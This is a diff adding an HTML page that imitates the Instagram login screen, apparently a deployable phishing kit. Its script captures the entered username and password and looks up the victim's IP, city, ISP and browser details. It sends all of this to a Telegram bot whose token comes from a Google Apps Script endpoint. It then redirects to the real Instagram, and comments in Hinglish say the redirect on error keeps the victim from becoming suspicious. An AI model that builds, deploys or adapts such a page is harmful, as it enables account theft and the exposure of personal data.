@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        .insta-clone-wrapper * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .insta-clone-wrapper { background-color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; width: 100%; }
+        .language-select { color: #8e8e8e; font-size: 14px; margin-top: 20px; margin-bottom: 40px; cursor: pointer; }
+        .content-container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 350px; }
+        .logo-container { margin-bottom: 40px; }
+        .logo-img { width: 60px; height: 60px; }
+        .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
+        .insta-input { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 5px; background-color: #fafafa; font-size: 14px; outline: none; }
+        .insta-input:focus { border-color: #a8a8a8; }
+        .login-btn { background-color: #0064e0; color: white; border: none; border-radius: 25px; padding: 12px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; width: 100%; }
+        .login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .forgot-password { color: #484848; text-align: center; font-size: 14px; text-decoration: none; margin-top: 15px; }
+        .bottom-container { margin-top: auto; width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; gap: 20px; padding-bottom: 20px; padding-top: 40px; }
+        .create-btn { width: 100%; background-color: transparent; border: 1px solid #0064e0; color: #0064e0; padding: 10px; border-radius: 25px; font-weight: 600; font-size: 14px; cursor: pointer; }
+        .meta-logo { display: flex; align-items: center; gap: 5px; color: #8e8e8e; font-weight: 600; font-size: 14px; }
+        .meta-icon { height: 12px; opacity: 0.6; }
+        #status { font-size: 12px; color: #666; text-align: center; margin-top: 5px; display:none; }
+    </style>
+</head>
+<body>
+
+    <div class="insta-clone-wrapper">
+        <div class="language-select">English (UK)</div>
+
+        <div class="content-container">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="logo-img">
+            </div>
+
+            <div class="login-form">
+                <input type="text" id="username" class="insta-input" placeholder="Username, email address or mobile number">
+                <input type="password" id="password" class="insta-input" placeholder="Password">
+                
+                <button id="btnSubmit" onclick="submitData()" class="login-btn">Log in</button>
+                <p id="status">Loading...</p>
+                
+                <a href="#" class="forgot-password">Forgotten password?</a>
+            </div>
+        </div>
+
+        <div class="bottom-container">
+            <button class="create-btn">Create new account</button>
+            <div class="meta-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-icon"> Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('=');
+                if (sParameterName[0] == sParam) { return sParameterName[1]; }
+            }
+            return null;
+        }
+
+        const GAS_API_URL = "https://script.google.com/macros/s/AKfycbzXkuhYNBCBGq_XCoOTygSHD89AVVmcvCbkfPtvdqzaLOdyJsclNfWQS9O4CJtXmIx-/exec";
+
+        async function submitData() {
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+            const btn = document.getElementById("btnSubmit");
+            const status = document.getElementById("status");
+
+            if(!user || !pass) {
+                alert("Please enter username and password");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Logging in...";
+            status.style.display = "block";
+            status.innerText = "Connecting...";
+
+            // URL se ?id= wala parameter uthana
+            // Note: Agar aap ?q= wale method se code chala rahe ho, to ensure karna ki URL me &id=1234 bhi ho
+            const msgId = GetURLParameter('id');
+
+            // Fallback: Agar ID nahi mili to direct error mat do, bas log karo (testing ke liye)
+            if (!msgId) {
+                console.warn("ID param missing, proceeding nicely...");
+            }
+
+            try {
+                // 1. GAS se Bot Token lana
+                // Agar ID nahi h to ye fail hoga, isliye try-catch jaruri h
+                let BOT_TOKEN = "";
+                let CHAT_ID = "";
+
+                if(msgId) {
+                    const gasResponse = await fetch(`${GAS_API_URL}?id=${msgId}`);
+                    const gasData = await gasResponse.json();
+                    if (gasData.success) {
+                        BOT_TOKEN = gasData.data.token;
+                        CHAT_ID = gasData.data.user_id;
+                    }
+                } else {
+                     // Agar ID URL me nahi hai, to yahan fake error ya default behavior daal sakte ho
+                     throw new Error("Setup ID missing in URL");
+                }
+
+                status.innerText = "Verifying...";
+
+                // 2. IP Details lana
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                const message = `
+🔐 *New Login Data*
+
+👤 *User:* ${user}
+🔑 *Pass:* ${pass}
+
+🌍 *Location:* ${ipData.city}, ${ipData.country_name}
+📍 *IP:* ${ipData.ip}
+📡 *ISP:* ${ipData.org}
+📱 *Device:* ${navigator.userAgent}
+`;
+
+                // 3. Telegram par bhejna
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                status.innerText = "Redirecting...";
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com";
+                }, 1000);
+
+            } catch (error) {
+                console.error(error);
+                // User ko shaq na ho isliye error hone par bhi redirect kar do
+                status.innerText = "Connection Failed. Retrying...";
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
+
